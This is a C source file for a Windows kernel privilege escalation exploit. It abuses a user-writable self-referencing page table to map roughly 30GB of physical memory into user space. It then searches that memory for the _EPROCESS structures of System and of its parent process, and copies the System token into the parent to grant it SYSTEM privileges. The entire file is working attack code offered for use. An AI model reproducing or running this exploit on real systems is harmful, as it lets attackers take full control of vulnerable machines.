// Nov 2021
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include "defines.h"
#include "wdm.h"

int main() {
    paging_tables level = PML4;
    //DebugBreak();
    pml4 = get_table_base_va(level); level = PDP;
    pdp = get_table_base_va(level); level = PD;
    pd = get_table_base_va(level); level = PT;
    pt = get_table_base_va(level);

    __try {
        *(ULONG_PTR*)pml4 = *(ULONG_PTR*)pml4;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("Not vulnerable :]\n");
        return 1;
    }

    ULONG_PTR* entry = 0;
    for (; added_entry < TABLE_MAX_ENTRIES; added_entry++) {
        entry = (ULONG_PTR*)(pml4 | ((DWORD64)added_entry * ENTRY_SIZE));

        if (*entry) {
            continue;
        }
        printf("Found a free PML4E: index %d @ %p\n", added_entry, entry);
        *entry = (DWORD64)(MAP_START | FLAGS);
        printf("PML4E has been added\n");
        break;
    }

    printf("reading back the PML4E to validate the writing ..\n");
    DWORD64 pml4e = NULL;
    if (entry && *entry)
        pml4e = *entry;
    if (!pml4e || pml4e ^ (MAP_START | FLAGS)) {
        printf("Adding the PML4E was unsuccessful :(\n");
        system("PAUSE");
        return 1;
    }
    UCHAR pml4e_flags = pml4e & 0xff;
    printf("\tPhysical Address: 0x%llx\n", (pml4e & ~0xFFF));

    printf("\tFlags: 0x%X\n" "\t\tPresent: O%s" "\t\tR/W: O%s" "\t\tU/S: O%s", \
        pml4e_flags, \
        (pml4e_flags & (1LLU << 0)) ? "N\n" : "FF\n", \
        (pml4e_flags & (1LLU << 1)) ? "N\n" : "FF\n", \
        (pml4e_flags & (1LLU << 2)) ? "N\n" : "FF\n"
    );


    __try {
        setup_pdp();
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("\nError while setting up the paging tables\n"); 
        system("PAUSE");
        return 1;
    }

    printf("~30GB of physical memory is now: U/S-R/W\n");

    found_eprocess eprocesses = { 0, 0 };
    DWORD64 system_eprocess, parent_process_eprocess;

    __try {
        phmem_find_eprocess(&eprocesses);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("\nError while searching for eprocess address in memory\n");
        system("PAUSE");
        return 1;
    }
    system_eprocess = eprocesses.system_eprocess;
    parent_process_eprocess = eprocesses.parent_process_eprocess;

    printf("duplicating the System's Token..\n");
    __try {

        if (!duplicate_token(parent_process_eprocess, system_eprocess)) {
            printf("Error while duplicating the System Token\n");
            system("PAUSE");
            return 1;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("\nError while duplicating the System token\n");
        system("PAUSE");
        return 1;
    }

    printf("done, the parent process has been elevated ^_^\n");
    return 0;
}


DWORD64 get_table_base_va(paging_tables level) {
    DWORD64 table_base_va = SELF_REF_ENTRY << (PDP_BITS_SIZE + PD_BITS_SIZE + PT_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE);
    table_base_va |= (level < 2 ? 0 : SELF_REF_ENTRY) << (PD_BITS_SIZE + PT_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE);
    table_base_va |= (level < 3 ? 0 : SELF_REF_ENTRY) << (PT_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE);
    table_base_va |= (level < 4 ? 0 : SELF_REF_ENTRY) << OFFSET_IN_FRAME_BITS_SIZE;
    table_base_va |= 0x0;

    (table_base_va & (1ULL << 47)) && (table_base_va |= SIGN_EXTEND);

    return table_base_va;
}

VOID setup_pdp() {
    UINT pdp_entry_index = 0, pd_entry_index = 0;
/*
    0x|sign extend|self ref|self ref|self ref|added entry|0x0
    this points to 0x10'000 in physicall memory and gives us the ability to read a page above this address using the 12bits offset (2^12)
    we will use this page frame to setup a PDP (only 31 entries, would be enuf to cover ~31gb)
*/
    ULONG_PTR* pdp_ptr = (ULONG_PTR*)(pdp | ((DWORD64)added_entry << OFFSET_IN_FRAME_BITS_SIZE));

    ULONG_PTR* pd_ptr;

    for (; pdp_entry_index < ENTRIES_TO_ADD; pdp_entry_index++) {
        *(ULONG_PTR *)((DWORD64)pdp_ptr | ((DWORD64)pdp_entry_index * ENTRY_SIZE)) = (MAP_START + PAGE_SIZE) | ((DWORD64)pdp_entry_index << OFFSET_IN_FRAME_BITS_SIZE) | FLAGS;
/*
        0x|sign extend|self ref|self ref|added entry|pdp entry index|0x0
        points to -> 0x11'000    
*/
        pd_ptr = (ULONG_PTR*)(pd | ((DWORD64)added_entry << (PT_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE)) | ((DWORD64)pdp_entry_index << OFFSET_IN_FRAME_BITS_SIZE));

/*
        mapping the physical memory starting from address 0, 2MiB for each page
        31  * 512 * 0x200'000 (2MiB)
*/
        pd_entry_index = 0;
        for (; pd_entry_index < TABLE_MAX_ENTRIES; pd_entry_index++) {
            printf("\r[PDP:%d|PD:%d] mapping [%llx] to [%p]", pdp_entry_index+1, pd_entry_index+1, ((DWORD64)pd_ptr | ((DWORD64)pd_entry_index * ENTRY_SIZE)), (void*)(((pdp_entry_index * TABLE_MAX_ENTRIES + pd_entry_index) * HUGE_PAGE_SIZE)));
            *(ULONG_PTR*)((DWORD64)pd_ptr | ((DWORD64)pd_entry_index * ENTRY_SIZE)) = ( ( (pdp_entry_index * TABLE_MAX_ENTRIES + pd_entry_index) * HUGE_PAGE_SIZE ) | HUGE_PAGE_FLAGS );
        }
    }
    puts("");
    return;
}

BOOL phmem_find_eprocess(found_eprocess* eprocesses) {
    DWORD64 eprocess = NULL;
    identifiers s_eporcess_identifers, p_eporcess_identifers;
    memory_regions mem_regions;
    process_info p_info = { 0 };
    HANDLE p_hdnl;

    if (!parse_phmem_regions(&mem_regions)) {
        printf("Error  while parsing physical memory regions\n");
        return FALSE;
    }
    printf("Hunting for the _EPROCESS's in physical memory..\n");

    s_eporcess_identifers.identifers[ImageFileNameIndex].offset = ImageFileNameOffset;
    memcpy(s_eporcess_identifers.identifers[ImageFileNameIndex].ImageFileName, "System\0\0\0\0\0\0\0\0", sizeof("System\0\0\0\0\0\0\0\0"));
    s_eporcess_identifers.identifers[PriorityClassIndex].offset = PriorityClassOffset;
    s_eporcess_identifers.identifers[PriorityClassIndex].PriorityClass = 0x2;
    s_eporcess_identifers.identifers[UniqueProcessIDIndex].offset = UniqueProcessIDOffset;
    s_eporcess_identifers.identifers[UniqueProcessIDIndex].UniqueProcessID = 0x4;
    s_eporcess_identifers.identifers[ProcessLockIndex].offset = ProcessLockOffset;
    s_eporcess_identifers.identifers[ProcessLockIndex].ProcessLock = 0ULL;


    p_info.pid = GetCurrentProcessId();
    if (!get_parent_process(&p_info)) {
        printf("Error while enumerating the parent process\n");
    }
    p_hdnl = OpenProcess(PROCESS_SET_INFORMATION, FALSE, p_info.pid); // handle to parent process
    SetPriorityClass(p_hdnl, REALTIME_PRIORITY_CLASS); // _EPROCESS.PriorityClass is set now to 3

    p_eporcess_identifers.identifers[ImageFileNameIndex].offset = ImageFileNameOffset;
    memcpy(p_eporcess_identifers.identifers[ImageFileNameIndex].ImageFileName, p_info.szExeFile, sizeof(p_info.szExeFile));
    p_eporcess_identifers.identifers[PriorityClassIndex].offset = PriorityClassOffset;
    p_eporcess_identifers.identifers[PriorityClassIndex].PriorityClass = 0x3;
    p_eporcess_identifers.identifers[UniqueProcessIDIndex].offset = UniqueProcessIDOffset;
    p_eporcess_identifers.identifers[UniqueProcessIDIndex].UniqueProcessID = p_info.pid;
    p_eporcess_identifers.identifers[ProcessLockIndex].offset = ProcessLockOffset;
    p_eporcess_identifers.identifers[ProcessLockIndex].ProcessLock = 0ULL;

    SetPriorityClass(OpenProcess(PROCESS_SET_INFORMATION, FALSE, GetCurrentProcessId()), REALTIME_PRIORITY_CLASS); // less scheduling for our process, so we find stuffs quicker

    search_memory(s_eporcess_identifers.identifers, p_eporcess_identifers.identifers, mem_regions, eprocesses);
    return;
}


BOOL parse_phmem_regions(memory_regions* mem_regions) {
    CM_RESOURCE_LIST* resource_list = NULL;
    memory_region* mem_regions_ptr = NULL;
    DWORD64 regions_count = 0;
    LPDWORD size = NULL;
    ULONG_PTR* data = NULL;
    LSTATUS status;


    status = RegGetValue(HKEY_LOCAL_MACHINE, PHMEM_REG_KEY, PHMEM_REG_VALUE_NAME, RRF_RT_ANY, NULL, NULL, &size);
    if (status != ERROR_SUCCESS) {
        printf("Error while reading the size of physical memory map from the registry.\n");
        return FALSE;
    }
    if (!(data = (ULONG_PTR*)LocalAlloc(LPTR, size))) {
        printf("Out Of Memory\n");
        return FALSE;
    }
    if (RegGetValue(HKEY_LOCAL_MACHINE, PHMEM_REG_KEY, PHMEM_REG_VALUE_NAME, RRF_RT_ANY, NULL, data, &size)) {
        printf("Error while reading the physical memory map from the registry.\n");
        return FALSE;
    }
    resource_list = (CM_RESOURCE_LIST*)data;
    
    for (int i = 0; i < resource_list->Count; i++) {
        for (int j = 0; j < resource_list->List[i].PartialResourceList.Count; j++) {
            if (resource_list->List[i].PartialResourceList.PartialDescriptors[j].Type == 3) {
                regions_count += 1;
            }
        }
    }
    if ( !(mem_regions_ptr = (memory_region*)LocalAlloc(LPTR, (regions_count * sizeof(memory_region)) ) ) ) {
        printf("Out Of Memory\n");
        return FALSE;
    }

    for (int i  = 0; i < resource_list->Count; i++) {
        for (int j = 0; j < resource_list->List[i].PartialResourceList.Count; j++) {
            if (resource_list->List[i].PartialResourceList.PartialDescriptors[j].Type == 3) {
                mem_regions_ptr->start = resource_list->List[i].PartialResourceList.PartialDescriptors[j].u.Memory.Start.QuadPart;
                mem_regions_ptr->size = resource_list->List[i].PartialResourceList.PartialDescriptors[j].u.Memory.Length;
                mem_regions_ptr->end = (mem_regions_ptr->start + mem_regions_ptr->size);
                mem_regions_ptr++;
            }
        }
    }
    mem_regions_ptr = (DWORD64)mem_regions_ptr - (regions_count * sizeof(memory_region));

    mem_regions->count = regions_count;
    mem_regions->regions = mem_regions_ptr;

    LocalFree((HLOCAL*)data);
    return TRUE;
}

VOID search_memory(_identifier* s_ids, _identifier* p_ids, memory_regions mem_map, found_eprocess* eprocesses) {
    DWORD64 start = NULL, end;
    LONG_PTR* address = NULL;
    INT s_found = -1, p_found = -1;
    DWORD64 eprocess = NULL;

    DWORD64 va_base = ((DWORD64)SIGN_EXTEND | ((DWORD64)added_entry << (PML4_BITS_SIZE + PDP_BITS_SIZE + PD_BITS_SIZE + OFFSET_IN_FRAME_BITS_SIZE)));
    for (int i = 0; i < mem_map.count; i++) {
        start = (DWORD64)(va_base | mem_map.regions[i].start);
        end = (va_base | mem_map.regions[i].end);
        address = (ULONG_PTR*)start;
        do {
            printf("\rsearching in: %016I64X - %016I64X (%I64X)", ((DWORD64)address & (DWORD64)PY_MEM_MASK), ((DWORD64)end & (DWORD64)PY_MEM_MASK),  (((DWORD64)end & (DWORD64)PY_MEM_MASK) - ((DWORD64)address & (DWORD64)PY_MEM_MASK)));
            fflush(stdout);

            if (eprocesses->system_eprocess == 0) {
                s_found = memcmp((UCHAR*)address, (UCHAR*)s_ids[ImageFileNameIndex].ImageFileName, sizeof(s_ids[ImageFileNameIndex].ImageFileName));
                if (s_found == 0) {
                    eprocesses->s_found = TRUE;
                }
            }
            if (eprocesses->parent_process_eprocess == 0) {
                p_found = memcmp(address, (UCHAR*)p_ids[ImageFileNameIndex].ImageFileName, sizeof(p_ids[ImageFileNameIndex].ImageFileName));
                if (p_found == 0) {
                    eprocesses->p_found = TRUE;
                }
            }
            if (s_found && p_found) { address++; continue; }

            eprocess = ((DWORD64)address - (DWORD64)ImageFileNameOffset);

            s_found = memcmp((UCHAR*)(eprocess + (DWORD64)s_ids[PriorityClassIndex].offset), &s_ids[PriorityClassIndex].PriorityClass, sizeof(s_ids[PriorityClassIndex].PriorityClass));
            p_found = memcmp((UCHAR*)(eprocess + (DWORD64)p_ids[PriorityClassIndex].offset), &p_ids[PriorityClassIndex].PriorityClass, sizeof(p_ids[PriorityClassIndex].PriorityClass));

            s_found = memcmp((UCHAR*)(eprocess + (DWORD64)s_ids[ProcessLockIndex].offset), &s_ids[ProcessLockIndex].ProcessLock, sizeof(s_ids[ProcessLockIndex].ProcessLock));
            p_found = memcmp((UCHAR*)(eprocess + (DWORD64)p_ids[ProcessLockIndex].offset), &p_ids[ProcessLockIndex].ProcessLock, sizeof(p_ids[ProcessLockIndex].ProcessLock));

            s_found = memcmp((UCHAR*)(eprocess + (DWORD64)s_ids[UniqueProcessIDIndex].offset), &s_ids[UniqueProcessIDIndex].UniqueProcessID, sizeof(s_ids[UniqueProcessIDIndex].UniqueProcessID));
            p_found = memcmp((UCHAR*)(eprocess + (DWORD64)p_ids[UniqueProcessIDIndex].offset), &p_ids[UniqueProcessIDIndex].UniqueProcessID, sizeof(s_ids[UniqueProcessIDIndex].UniqueProcessID));
            
            if (eprocesses->s_found && s_found == 0) {
                eprocesses->system_eprocess = eprocess;
                printf("\nFound System's _EPRPCESS: %llx\n", eprocesses->system_eprocess);
            } 
            if (eprocesses->p_found && p_found == 0) {
                eprocesses->parent_process_eprocess = eprocess;
                //address = (ULONG_PTR*)((DWORD64)va_base | (DWORD64)0x7ff0c000ULL);
                printf("\nFound %s's _EPRPCESS: %llx\n", p_ids[ImageFileNameIndex].ImageFileName, eprocesses->parent_process_eprocess);
            }

            if (eprocesses->system_eprocess && eprocesses->parent_process_eprocess) {
                return;
            }

            address++; s_found = -1; p_found = -1;
        }  while ( (DWORD64)address < end );
        fflush(stdout); puts(""); fflush(stdout);
    }
}


BOOL get_parent_process(process_info* p_info) {
    HANDLE snapchot_handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32);

    Process32First(snapchot_handle, &pe32);

    do
    {
        if (p_info->pid == pe32.th32ProcessID) {
            p_info->pid = pe32.th32ParentProcessID;
            Process32First(snapchot_handle, &pe32);
            do {
                if (p_info->pid == pe32.th32ProcessID) {
                    wcstombs_s(NULL, p_info->szExeFile, sizeof(p_info->szExeFile), (wchar_t*)pe32.szExeFile, sizeof(p_info->szExeFile));
                    return TRUE;
                }
            } while (Process32Next(snapchot_handle, &pe32));
        }
    } while (Process32Next(snapchot_handle, &pe32));

    return FALSE;
}

BOOL duplicate_token(DWORD64 to, DWORD64 from) {
    DWORD64 old = *(DWORD64*)(to + (DWORD64)TokenOffset);
    *(DWORD64*)(to + (DWORD64)TokenOffset) = *(DWORD64*)((DWORD64)from + (DWORD64)TokenOffset);

    if (old == *(DWORD64*)(to + (DWORD64)TokenOffset))
        return FALSE;

    return TRUE;
}
